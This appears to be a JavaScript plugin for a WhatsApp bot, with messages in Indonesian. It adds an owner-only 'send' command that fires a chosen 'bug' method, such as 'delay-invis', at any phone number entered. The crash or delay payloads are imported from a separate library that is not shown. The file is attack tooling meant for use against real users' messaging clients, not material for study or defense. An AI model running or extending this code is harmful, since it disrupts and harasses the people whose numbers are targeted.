/**
 * @file Bug send command
 * @module plugins/owner/send
 */

import { bugMethods } from "#lib/bug.js";

let handler = async (m, { sock, args, usedPrefix, command }) => {
    if (!args[0] || !args[1]) {
        return m.reply(`*Format Salah!*\n\n*Usage:* ${usedPrefix + command} <nomor> <method>\n*Example:* ${usedPrefix + command} 628xxx delay-invis`);
    }

    let target = args[0].replace(/[^0-9]/g, "");
    const method = args[1]?.toLowerCase();

    if (!target.endsWith("@s.whatsapp.net")) {
        target += "@s.whatsapp.net";
    }

    if (!bugMethods[method]) {
        return m.reply(`❌ Method *${method}* tidak ditemukan.\nKetik *.methods* untuk melihat list.`);
    }

    await m.reply(`🚀 Mengirim bug *${method}* ke target *${target}*...`);

    try {
        // As per user case: await protocolbug8(isTarget, true)
        await bugMethods[method](sock, target, true);
        await m.reply(`✅ Berhasil merelay bug *${method}* ke target.`);
    } catch (e) {
        sock.logger.error(e);
        await m.reply(`❌ Gagal mengirim bug: ${e.message}`);
    }
};

handler.help = ["send"];
handler.tags = ["owner"];
handler.command = /^(send)$/i;
handler.owner = true;

export default handler;
